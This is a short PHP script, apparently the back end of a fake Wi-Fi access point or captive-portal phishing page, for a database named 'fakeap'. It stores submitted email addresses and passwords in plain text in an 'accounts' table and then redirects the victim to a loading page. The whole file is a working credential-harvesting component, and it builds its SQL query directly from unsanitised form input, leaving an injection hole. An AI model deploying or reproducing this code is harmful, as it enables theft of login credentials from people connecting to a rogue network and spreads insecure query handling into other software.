<?php
session_start();
ob_start();
$host="localhost";
$username="user";
$pass="password";
$dbname="fakeap";
$tbl_name="accounts";
// Create connection
$conn = mysqli_connect($host, $username, $pass, $dbname);// Check connection
if ($conn) {
    $email=$_POST['email'];
    $password=$_POST['password'];
    $sql = "INSERT INTO accounts (email, password) VALUES ('$email', '$password')";
    mysqli_query($conn, $sql);
    mysqli_close($conn);
}
sleep(1);
header("location:loading.html");
ob_end_flush();
?>
